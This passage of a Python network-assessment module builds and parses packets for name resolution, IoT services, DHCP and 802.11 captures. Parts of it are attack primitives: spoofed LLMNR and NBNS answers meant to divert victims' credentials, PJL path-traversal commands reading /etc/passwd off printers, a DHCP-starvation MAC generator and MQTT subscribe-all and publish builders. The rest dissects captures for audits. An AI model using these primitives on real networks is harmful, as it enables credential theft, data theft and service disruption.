    body = tlv(0x0001, version.encode()[:32])                     # version
    body += tlv(0x0002, device_id.encode()[:32])                  # device id
    body += tlv(0x0003, port.encode()[:32])                       # port id
    body += tlv(0x0004, struct.pack(">I", capabilities))          # capabilities
    body += tlv(0x0005, version.encode()[:32])                    # software version
    body += tlv(0x0006, platform.encode()[:32])                   # platform
    if address:
        body += tlv(0x0002, b"")                                  # placeholder (unused)
        body += tlv(0x0000, b"")                                  # end of CDP
    return b"\xaa\xaa\x03\x00\x00\x0c\x20\x00" + body


# --------------------------------------------------------------------------- #
# name resolution: DNS, LLMNR, NBNS and mDNS
# --------------------------------------------------------------------------- #

LLMNR_PORT = 5355
MDNS_PORT = 5353
NBNS_PORT = 137
NBT_PORT = 138


def _dns_header(transaction: int, questions: int, answers: int, authority: int = 0,
                additional: int = 0, response: bool = True, authoritative: bool = True,
                rcode: int = 0) -> bytes:
    flags = 0x8000 if response else 0
    flags |= 0x0400 if authoritative else 0
    flags |= rcode & 0x0F
    return struct.pack(">HHHHHH", transaction & 0xFFFF, flags, questions, answers,
                       authority, additional)


def llmnr_query(name: str, transaction: int = 0x1234, qtype: int = 1) -> bytes:
    """An LLMNR query (RFC 4795) — broadcast to the local link by Windows hosts.

    LLMNR exists so a host can resolve a name without a DNS server, which means the
    *first* answer to arrive wins, and anybody on the segment can be first.  The
    question is encoded exactly like DNS.
    """
    return _dns_header(transaction, 1, 0, response=False, authoritative=False) \
        + encode_name(name) + struct.pack(">HH", qtype, 1)


def llmnr_response(question: bytes, address: str, name: str = "",
                   transaction: int = 0x1234) -> bytes:
    """An LLMNR answer: the response an attacker sends to claim a name."""
    name = name or _question_name(question)
    rr = encode_name(name) + struct.pack(">HHIH", 1, 1, 30, 4) + ipv4_bytes(address)
    return _dns_header(transaction, 1, 1) + encode_name(name) \
        + struct.pack(">HH", 1, 1) + rr


def _question_name(packet: bytes) -> str:
    """The first question name of a DNS-shaped packet (best effort, never raises)."""
    try:
        offset = 12
        labels = []
        while offset < len(packet):
            length = packet[offset]
            if length == 0 or length > 63:
                break
            labels.append(packet[offset + 1:offset + 1 + length].decode("latin-1"))
            offset += 1 + length
        return ".".join(labels)
    except Exception:                                            # pragma: no cover
        return ""


def nbns_query(name: str, transaction: int = 0x1234) -> bytes:
    """A NetBIOS name service query: the first-born name resolution of Windows.

    The name is encoded in NetBIOS's "first-level encoding" — each nibble of each
    uppercase character becomes a letter A-P, in two 16-byte halves — and the answer to
    it, by the *first* responder, is how an NBNS spoofing tool gets a victim to send
    its credentials to the attacker's SMB server.
    """
    encoded = bytearray([32])
    for nibble in _nbns_nibbles(name):
        encoded.append(0x41 + nibble)
    encoded.append(0)
    question = bytes(encoded) + struct.pack(">HH", 0x20, 1)      # NBSTAT/name, IN
    header = struct.pack(">HHHHHH", transaction & 0xFFFF, 0x0110, 1, 0, 0, 0)
    return header + question


def _nbns_nibbles(name: str) -> List[int]:
    padded = (name.upper()[:15] + " " * 15)[:15] + "\x00"
    raw = padded.encode("ascii", "replace")[:16]
    out: List[int] = []
    for byte in raw:
        out.append((byte >> 4) & 0x0F)
        out.append(byte & 0x0F)
    return out[:32]


def nbns_response(question: bytes, address: str, transaction: int = 0x1234,
                  name: str = "") -> bytes:
    """A positive NetBIOS name answer pointing the name at the attacker."""
    raw_name = bytes(question[12:12 + 34]) if len(question) >= 46 else bytes(34)
    rr = raw_name + struct.pack(">HHIH", 0x0020, 0x0001, 60, 6) + b"\x00\x00" \
        + ipv4_bytes(address)
    return struct.pack(">HHHHHH", transaction & 0xFFFF, 0x8500, 0, 1, 0, 0) + rr


def mdns_query(name: str, transaction: int = 0, qtype: int = 1) -> bytes:
    """An mDNS query (RFC 6762): port 5353 on 224.0.0.251, no server in the middle."""
    return _dns_header(transaction, 1, 0, response=False, authoritative=False) \
        + encode_name(name) + struct.pack(">HH", qtype, 1)


def mdns_response(name: str, address: str, transaction: int = 0,
                  ttl: int = 120) -> bytes:
    """An mDNS unsolicited answer, announcing a name at an address."""
    rr = (encode_name(name) + struct.pack(">HHIH", 1, 0x8000 | 1, ttl, 4)
          + ipv4_bytes(address))
    return _dns_header(transaction, 0, 1, authoritative=True, response=True) + rr


def parse_llmnr(data: bytes) -> Dict[str, Any]:
    """Read a name-resolution packet in any of the four dialects."""
    out: Dict[str, Any] = {"questions": [], "answers": []}
    if len(data) < 12:
        return out
    transaction, flags, questions, answers = struct.unpack(">HHHH", data[:8])
    out.update({"transaction": transaction, "response": bool(flags & 0x8000),
                "rcode": flags & 0x0F})
    offset = 12
    for _index in range(questions):
        name, offset = _read_name(data, offset)
        if offset + 4 > len(data):
            break
        qtype, _qclass = struct.unpack_from(">HH", data, offset)
        offset += 4
        out["questions"].append({"name": name, "type": qtype})
    for _index in range(answers):
        name, offset = _read_name(data, offset)
        if offset + 10 > len(data):
            break
        rtype, rclass, ttl, length = struct.unpack_from(">HHIH", data, offset)
        offset += 10
        value = data[offset:offset + length]
        offset += length
        entry = {"name": name, "type": rtype, "ttl": ttl}
        if rtype == 1 and length == 4:
            entry["address"] = ipv4_text(value)
        out["answers"].append(entry)
    return out


def _read_name(data: bytes, offset: int, depth: int = 0) -> Tuple[str, int]:
    """Read a DNS name, following one level of compression pointers."""
    labels: List[str] = []
    start = offset
    followed = False
    while offset < len(data) and depth < 8:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0 == 0xC0:
            pointer = int.from_bytes(data[offset:offset + 2], "big") & 0x3FFF
            if not followed:
                start = offset + 2
                followed = True
            offset = pointer
            depth += 1
            continue
        labels.append(data[offset + 1:offset + 1 + length].decode("latin-1"))
        offset += 1 + length
    return ".".join(labels), (start if followed else offset)


# --------------------------------------------------------------------------- #
# IT-device service protocols: MQTT, RTSP, PJL, TELNET
# --------------------------------------------------------------------------- #

def mqtt_varlen(value: int) -> bytes:
    """MQTT's remaining-length encoding: 7 bits per byte, high bit means "continues"."""
    out = bytearray()
    while True:
        digit = value % 128
        value //= 128
        if value:
            digit |= 0x80
        out.append(digit)
        if not value:
            break
    return bytes(out)


def mqtt_packet(kind: int, flags: int, payload: bytes) -> bytes:
    """An MQTT control packet: type/flags byte, variable length, payload."""
    return bytes([((kind & 0x0F) << 4) | (flags & 0x0F)]) + mqtt_varlen(len(payload)) \
        + bytes(payload)


def mqtt_connect(client_id: str, keepalive: int = 60, clean: bool = True,
                 username: str = "", password: str = "") -> bytes:
    """An MQTT CONNECT: the packet a broker answers with CONNACK (and no auth at all,
    on the installations that are the actual finding)."""
    flags = 0x02 if clean else 0
    if username:
        flags |= 0x80
    if password:
        flags |= 0x40
    body = bytes([0x00, 0x04]) + b"MQTT" + bytes([0x04, flags]) \
        + struct.pack(">H", keepalive)
    body += struct.pack(">H", len(client_id)) + client_id.encode()
    if username:
        body += struct.pack(">H", len(username)) + username.encode()
    if password:
        body += struct.pack(">H", len(password)) + password.encode()
    return mqtt_packet(1, 0, body)


def mqtt_subscribe(topic: str, packet_id: int = 1, qos: int = 0) -> bytes:
    """An MQTT SUBSCRIBE with one topic filter — ``#`` is every topic on the broker."""
    body = struct.pack(">H", packet_id) + struct.pack(">H", len(topic)) \
        + topic.encode() + bytes([qos & 0x03])
    return mqtt_packet(8, 0x02, body)


def mqtt_publish(topic: str, payload: bytes, qos: int = 0, retain: bool = False,
                 packet_id: int = 0) -> bytes:
    """An MQTT PUBLISH: the packet that turns a broker into a remote control."""
    body = struct.pack(">H", len(topic)) + topic.encode()
    if qos:
        body = struct.pack(">H", len(topic)) + topic.encode() + struct.pack(">H", packet_id)
    return mqtt_packet(3, (qos << 1) | (1 if retain else 0), body + bytes(payload))


MQTT_CONNACK_CODES = {0: "accepted", 1: "unacceptable protocol version",
                      2: "identifier rejected", 3: "server unavailable",
                      4: "bad user name or password", 5: "not authorized"}


def parse_mqtt(data: bytes) -> Dict[str, Any]:
    """Read an MQTT control packet header, and a CONNACK's return code."""
    if len(data) < 2:
        return {}
    kind = data[0] >> 4
    length, offset = 0, 1
    multiplier = 1
    while offset < len(data) and offset < 5:
        digit = data[offset]
        length += (digit & 0x7F) * multiplier
        multiplier *= 128
        offset += 1
        if not digit & 0x80:
            break
    out: Dict[str, Any] = {"type": kind, "length": length,
                           "type_name": {1: "CONNECT", 2: "CONNACK", 3: "PUBLISH",
                                         4: "PUBACK", 8: "SUBSCRIBE",
                                         9: "SUBACK", 12: "PINGREQ",
                                         13: "PINGRESP", 14: "DISCONNECT"}.get(kind, str(kind)),
                           "payload": data[offset:offset + max(0, length)][:64]}
    if kind == 2 and offset + 2 <= len(data):
        out["session_present"] = bool(data[offset] & 0x01)
        code = data[offset + 1]
        out["return_code"] = code
        out["return_text"] = MQTT_CONNACK_CODES.get(code, f"code {code}")
    return out


def rtsp_request(method: str = "DESCRIBE", url: str = "rtsp://192.168.1.64/",
                 cseq: int = 1, authorization: str = "") -> bytes:
    """An RTSP request: the DESCRIBE an IP camera answers, with or without a password.

    RTSP is HTTP-shaped, and the camera's answer to an unauthenticated DESCRIBE contains
    the SDP media description — codecs, resolutions, sometimes the encoder's own name.
    """
    lines = [f"{method.upper()} {url} RTSP/1.0", f"CSeq: {cseq}",
             "User-Agent: wifipilot"]
    if authorization:
        lines.append(f"Authorization: {authorization}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode()


def rtsp_basic_authorization(username: str, password: str) -> str:
    import base64

    token = base64.b64encode(f"{username}:{password}".encode()).decode()
    return f"Basic {token}"


def parse_rtsp(text: str) -> Dict[str, Any]:
    """Status code, headers and SDP body of an RTSP response."""
    lines = text.splitlines()
    out: Dict[str, Any] = {"headers": {}, "body": "", "code": 0, "reason": ""}
    if not lines:
        return out
    parts = lines[0].split(" ", 2)
    if len(parts) >= 2 and parts[0].startswith("RTSP"):
        try:
            out["code"] = int(parts[1])
        except ValueError:
            out["code"] = 0
        out["reason"] = parts[2] if len(parts) > 2 else ""
    for line in lines[1:]:
        if ":" in line:
            key, _, value = line.partition(":")
            out["headers"][key.strip().lower()] = value.strip()
        elif not line.strip():
            continue
    if "\r\n\r\n" in text:
        out["body"] = text.split("\r\n\r\n", 1)[1]
    return out


#: PJL: the Printer Job Language.  ``INFO ID`` names the model, ``FSUPLOAD`` reads a
#: file off the printer's filesystem — the pair of commands behind every "your MFP is
#: storing documents and hands them over to anyone who can reach port 9100".
PJL_FILESYSTEM = ("@PJL FSDIRLIST NAME=\"0:/../..\" ENTRY=1 COUNT=64\r\n",
                  "@PJL FSUPLOAD NAME=\"0:/../../etc/passwd\" OFFSET=0 SIZE=512\r\n")


def pjl_command(command: str = "@PJL INFO ID", end: str = "\r\n") -> bytes:
    """A PJL command wrapped in a UEL so the printer treats it as a fresh job."""
    body = "\x1b%-12345X" + command + end
    return body.encode("latin-1")


def pjl_job(commands: Sequence[str] = ("@PJL INFO ID",)) -> bytes:
    """A real PJL job: UEL, the commands, UEL again."""
    body = "".join(f"\x1b%-12345X{command}\r\n" for command in commands)
    return body.encode()


TELNET_OPTIONS = {1: "echo", 3: "suppress go ahead", 5: "status", 24: "terminal type",
                  31: "window size", 32: "terminal speed", 33: "remote flow control",
                  34: "linemode", 39: "environment"}


def telnet_negotiation(option: int = 24, command: int = 0xFB,
                       value: bytes = b"VT100") -> bytes:
    """TELNET option negotiation: IAC, command (WILL/DO/WONT/DONT), option, sub-data."""
    payload = bytes([0xFF, command & 0xFF, option & 0xFF])
    if command in (0xFA,):                                       # subnegotiation
        payload += bytes([0x00]) + value + bytes([0xFF, 0xF0])
    return payload


# --------------------------------------------------------------------------- #
# DHCP message types the assessment needs and a client never sends
# --------------------------------------------------------------------------- #

#: DHCP message type numbers, by name, for the builders below
DHCP_RELEASE = 7
DHCP_DECLINE = 4
DHCP_INFORM = 8
DHCP_FORCERENEW = 9
DHCP_LEASEQUERY = 10
DHCP_LEASEUNASSIGNED = 11
DHCP_LEASEUNKNOWN = 12

#: the shapes of MAC address a DHCP starvation attack uses: it needs many, and the
#: vendor prefix it picks decides how the log reads afterwards
DHCP_FLOOD_MACS = ("02:00:00:%02x:%02x:%02x", "02:11:22:%02x:%02x:%02x",
                   "00:0c:29:%02x:%02x:%02x", "00:1c:42:%02x:%02x:%02x")


def dhcp_flood_mac(index: int, pattern: int = 0) -> str:
    """A distinct locally-administered MAC for the *index*-th starved client."""
    template = DHCP_FLOOD_MACS[pattern % len(DHCP_FLOOD_MACS)]
    return template % ((index >> 16) & 0xFF, (index >> 8) & 0xFF, index & 0xFF)


# --------------------------------------------------------------------------- #
# Dissection: from a capture file to the fields an audit can count
# --------------------------------------------------------------------------- #
#: the LLC/SNAP prefix every Ethernet payload carries inside an 802.11 data frame
SNAP_HEADER = b"\xaa\xaa\x03\x00\x00\x00"

#: 802.11 data subtypes that can carry an LLC payload (QoS ones included)
DATA_SUBTYPES = (0, 4, 8, 12)


def snap_ethertype(body: bytes) -> int:
    """The ethertype inside a SNAP header, or 0 when the body is not SNAP at all."""
    if len(body) >= 8 and body[:6] == SNAP_HEADER:
        return int.from_bytes(body[6:8], "big")
    return 0


def strip_radiotap(frame: bytes) -> Tuple[bytes, int]:
    """Drop a radiotap header when there is one, returning ``(frame, length)``.

    Radiotap says how *long* it is in its third and fourth bytes, and its version byte is
    zero; those two facts are enough to tell it apart from an 802.11 frame, whose first
    byte is the frame control field with a zero protocol version and a valid type.  A
    capture can carry either shape under the same link type, so a dissector checks rather
    than assumes.
    """
    if len(frame) >= 8 and frame[0] == 0:
        length = int.from_bytes(frame[2:4], "little")
        if 8 <= length <= 64 and len(frame) > length and (frame[length] & 0x03) == 0:
            return frame[length:], length
    return frame, 0


def strip_80211_data(frame: bytes) -> Tuple[bytes, int]:
    """Turn an 802.11 data frame back into the Ethernet frame it was carrying.

    Returns ``(ethernet, header_length)``.  The Ethernet header has to be rebuilt:
    802.11 keeps the destination and the source in its own header, and the LLC/SNAP
    preamble replaces the ethertype's usual place, so the bytes on the wire are not an
    Ethernet frame until they are reassembled this way.  A parser that forgets this
    reads "aa aa 03" as the destination MAC and reports nonsense ARP traffic.
    """
    frame, radiotap = strip_radiotap(frame)
    if len(frame) < 24:
        return b"", 0
    control = frame[0]
    if (control & 0x0C) != 0x08:                       # not a data frame
        return b"", 0
    subtype = (control >> 4) & 0x0F
    to_ds = bool(frame[1] & 0x01)
    from_ds = bool(frame[1] & 0x02)
    header = 24
    if to_ds and from_ds:
        header += 6                                     # address 4
    if subtype & 0x08:                                  # QoS data: 2 extra bytes
        header += 2
    if frame[1] & 0x80 and (subtype & 0x08):            # order bit on QoS data = HT
        header += 4
    if len(frame) < header + 8:
        return b"", header
    destination = frame[4:10]
    if to_ds and from_ds:
        source = frame[24:30]
    else:
        source = frame[10:16]
    body = frame[header:]
    kind = snap_ethertype(body)
    if not kind:
        return b"", header + radiotap
    payload = body[8:]
    return (bytes(destination) + bytes(source) + struct.pack(">H", kind) + payload,
            header + radiotap)


def parse_tcp_packet(segment: bytes) -> Dict[str, Any]:
    """A TCP segment: ports, sequence numbers, the flags that matter, and its payload."""
    out: Dict[str, Any] = {"source_port": 0, "dest_port": 0, "sequence": 0,
                           "acknowledgement": 0, "flags": 0, "flag_names": [],
                           "window": 0, "payload": b"", "header_length": 0}
    if len(segment) < 20:
        return out
    out["source_port"], out["dest_port"], out["sequence"], out["acknowledgement"] = \
        struct.unpack(">HHII", segment[:12])
    offset = (segment[12] >> 4) * 4
    out["flags"] = segment[13]
    out["header_length"] = offset
    out["window"] = int.from_bytes(segment[14:16], "big")
    from .netproto import tcp_flag_names
    try:
        out["flag_names"] = list(tcp_flag_names(segment[13]))
    except Exception:                                    # pragma: no cover - defensive
        out["flag_names"] = []
    out["payload"] = segment[offset:] if offset >= 20 else segment[20:]
    return out


def parse_arp(packet: bytes) -> Dict[str, Any]:
    """An ARP packet: who is asking for whom, and who is answering."""
    out: Dict[str, Any] = {"operation": 0, "sender_mac": "", "sender_ip": "",
                           "target_mac": "", "target_ip": "", "gratuitous": False,
                           "kind": ""}
    if len(packet) < 28:
        return out
    from .netproto import bytes_to_mac, ipv4_text
    out["operation"] = int.from_bytes(packet[6:8], "big")
    out["sender_mac"] = bytes_to_mac(packet[8:14])
    out["sender_ip"] = ipv4_text(packet[14:18])
    out["target_mac"] = bytes_to_mac(packet[18:24])
    out["target_ip"] = ipv4_text(packet[24:28])
    out["gratuitous"] = out["sender_ip"] == out["target_ip"]
    if out["gratuitous"]:
        out["kind"] = "gratuitous announcement"
    elif out["operation"] == 1:
        out["kind"] = "who-has"
    elif out["operation"] == 2:
        out["kind"] = "is-at" if out["target_mac"] != BROADCAST else "broadcast is-at"
    return out


def parse_ipv6_header(packet: bytes) -> Dict[str, Any]:
    """An IPv6 header (RFC 8200) with its addresses and next header."""
    out: Dict[str, Any] = {"source": "", "destination": "", "next_header": 0,
                           "payload_length": 0, "hop_limit": 0}
    if len(packet) < 40:
        return out
    out["payload_length"] = int.from_bytes(packet[4:6], "big")
    out["next_header"] = packet[6]
    out["hop_limit"] = packet[7]
    out["source"] = ipv6_text(packet[8:24])
    out["destination"] = ipv6_text(packet[24:40])
    return out


def dissect_ethernet(frame: bytes) -> Dict[str, Any]:
    """Dissect an Ethernet frame all the way to the fields an audit counts.

    One flat dictionary per frame is deliberate: the network-layer attacks count
    things ("how many SYN-only packets", "how many DHCP OFFERs from a server that is
    not the gateway"), and a nested tree only gets flattened again at every count.
    """
    out: Dict[str, Any] = {"dst": "", "src": "", "ethertype": 0, "protocol": "",
                           "vlans": [], "length": len(frame), "src_ip": "",
                           "dst_ip": "", "ip_id": 0, "ttl": 0, "src_port": 0,
                           "dst_port": 0, "flags": 0, "flag_names": [], "payload": b"",
                           "text": "", "arp": None, "dhcp": None, "icmp_type": None,
                           "icmpv6_type": None, "tcp_syn": False, "tcp_ack": False}
    if len(frame) < 14:
        return out
    info = parse_ethernet(frame)
    if "destination" not in info:
        return out
    out.update({"dst": info["destination"], "src": info["source"],
                "ethertype": info["ethertype"], "vlans": list(info.get("vlans") or [])})
    kind = out["ethertype"]
    body = info["payload"]
    if kind == 0x0806:
        out["protocol"] = "arp"
        out["arp"] = parse_arp(body)
        return out
    if kind == 0x86DD:
        info6 = parse_ipv6_header(body)
        if not info6["source"]:
            out["protocol"] = "ipv6-truncated"
            return out
        out["protocol"] = "ipv6"
        out.update({"src_ip": info6["source"], "dst_ip": info6["destination"],
                    "ttl": info6["hop_limit"]})
        inner = body[40:]
        if info6["next_header"] == 58:
            parsed = parse_icmpv6(inner)
            out["icmpv6_type"] = parsed.get("type")
            out["icmpv6"] = parsed
            out["payload"] = inner
            out["text"] = ascii_preview(inner)
        elif info6["next_header"] == 17:
            segment = parse_udp_packet(inner)
            if not segment:
                return out
            out.update({"src_port": segment["source_port"],
                        "dst_port": segment["dest_port"],
                        "payload": segment["payload"]})
            _annotate_application(out)
        return out
    if kind == 0x888E:
        out["protocol"] = "eapol"
        out["payload"] = body
        return out
    if kind == 0x88CC:
        out["protocol"] = "lldp"
        out["payload"] = body
        out["lldp"] = parse_lldp(body)
        return out
    if kind == 0x0842:
        out["protocol"] = "wake-on-lan"
        out["payload"] = body
        return out
    if kind == 0x88F7:
        out["protocol"] = "ptp"
        out["payload"] = body
        return out
    if kind <= 0x05DC:                                  # 802.3 length == LLC (STP, LLDP)
        out["protocol"] = "llc"
        if body[:3] == b"\x42\x42\x03":
            out["protocol"] = "stp"
            out["payload"] = body
            out["stp"] = parse_bpdu(body[3:])
        elif body[:3] == b"\xaa\xaa\x03" and len(body) >= 8:
            snap_kind = int.from_bytes(body[6:8], "big")
            out["protocol"] = "lldp" if snap_kind == 0x88CC else f"snap-{snap_kind:04x}"
            out["payload"] = body[8:]
            if snap_kind == 0x88CC:
                out["lldp"] = parse_lldp(body[8:])
        return out
    if kind != 0x0800:
        return out
    info4 = parse_ipv4_header(body)
    if not info4:
        out["protocol"] = "ipv4-truncated"
        return out
    out["protocol"] = "ipv4"
    out.update({"src_ip": info4["source"], "dst_ip": info4["destination"],
                "ip_id": info4["identification"], "ttl": info4["ttl"]})
    inner = body[info4["header_length"]:]
    if info4["protocol"] == 17:
        segment = parse_udp_packet(inner)
        if not segment:
            return out
        out.update({"src_port": segment["source_port"], "dst_port": segment["dest_port"],
                    "payload": segment["payload"]})
    elif info4["protocol"] == 6:
        segment = parse_tcp_packet(inner)
        out.update({"src_port": segment["source_port"], "dst_port": segment["dest_port"],
                    "flags": segment["flags"], "flag_names": segment["flag_names"],
                    "payload": segment["payload"]})
        out["tcp_syn"] = bool(segment["flags"] & 0x02)
        out["tcp_ack"] = bool(segment["flags"] & 0x10)
        out["tcp_rst"] = bool(segment["flags"] & 0x04)
    elif info4["protocol"] == 1:
        parsed = parse_icmp(inner)
        out["icmp_type"] = parsed.get("type")
        out["icmp"] = parsed
        out["payload"] = inner
    _annotate_application(out)
    return out


def _annotate_application(out: Dict[str, Any]) -> None:
    """Name the application protocol and pull out what an audit would read."""
    payload = out.get("payload") or b""
    if not payload:
        return
    sport, dport = out.get("src_port", 0), out.get("dst_port", 0)
    if out.get("dst_ip") in ("255.255.255.255", BROADCAST) or sport in (67, 68) \
            or dport in (67, 68):
        from .netproto import parse_dhcp
        parsed = parse_dhcp(payload)
        if parsed.get("message_type"):
            out["dhcp"] = parsed
            out["protocol"] = "dhcp"
            return
    out["text"] = ascii_preview(payload)
    if 1883 in (sport, dport) or 8883 in (sport, dport):
        out["mqtt"] = parse_mqtt(payload)
        out["protocol"] = "mqtt"
    elif 53 in (sport, dport) or 5355 in (sport, dport) or 137 in (sport, dport) \
            or 5353 in (sport, dport):
        out["dns"] = parse_llmnr(payload)
        out["protocol"] = "name-service"


def ascii_preview(data: bytes, limit: int = 120) -> str:
    """A printable rendering of a payload, for the cleartext-credential audits."""
    text = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in data[:limit])
    return text


def iter_network_frames(path: str, max_packets: int = 200_000):
    """Yield ``(timestamp, dissected)`` for every frame in a capture.

    The capture's own link type decides how the frame is unwrapped: a monitor-mode
    capture is 802.11 and has to have its LLC/SNAP reassembled, a wired capture is
    already Ethernet.  Everything above that is identical, which is the point — the
    same audit works on a wireless capture and on a span port.
    """
    from . import pcap
    for timestamp, link_type, payload in pcap.iter_records(path, max_packets=max_packets):
        frame = payload
        if link_type in (105, 127):
            frame, _header = strip_80211_data(payload)
            if not frame:
                continue
        elif link_type == 113:                          # Linux cooked capture v1
            if len(payload) < 16:
                continue
            frame = payload[14:16] + payload[6:12] + payload[14:]
        elif link_type not in (1, 0):
            continue
        dissected = dissect_ethernet(frame)
        if dissected.get("dst") or dissected.get("protocol"):
            yield timestamp, dissected


def network_summary(path: str) -> Dict[str, Any]:
    """Count what is in a capture, by protocol and by the things that matter."""
    summary: Dict[str, Any] = {"frames": 0, "protocols": {}, "dhcp": {}, "arp": {},
                               "icmp": {}, "tcp_syn_only": 0, "udp_ports": {},
                               "hosts": set(), "broadcasts": 0}
    for _timestamp, frame in iter_network_frames(path):
        summary["frames"] += 1
        protocol = frame.get("protocol") or "other"
        summary["protocols"][protocol] = summary["protocols"].get(protocol, 0) + 1
        if frame.get("src") == BROADCAST or frame.get("dst") == BROADCAST:
            summary["broadcasts"] += 1
        if frame.get("src_ip"):
            summary["hosts"].add(frame["src_ip"])
        if frame.get("tcp_syn") and not frame.get("tcp_ack"):
            summary["tcp_syn_only"] += 1
        if frame.get("src_port"):
            key = (frame["src_port"], frame.get("dst_port"))
            summary["udp_ports"][key] = summary["udp_ports"].get(key, 0) + 1
        dhcp = frame.get("dhcp")
        if dhcp:
            kind = dhcp.get("message_type") or "unknown"
            summary["dhcp"][kind] = summary["dhcp"].get(kind, 0) + 1
        arp = frame.get("arp")
        if arp:
            key = "gratuitous" if arp["gratuitous"] else arp["kind"] or "other"
            summary["arp"][key] = summary["arp"].get(key, 0) + 1
        if frame.get("icmp_type") is not None:
            key = f"icmp {frame['icmp_type']}"
            summary["icmp"][key] = summary["icmp"].get(key, 0) + 1
        if frame.get("icmpv6_type") is not None:
            key = f"icmpv6 {frame['icmpv6_type']}"
            summary["icmp"].setdefault(key, 0)
            summary["icmp"][key] += 1
    summary["hosts"] = sorted(summary["hosts"])
    return summary
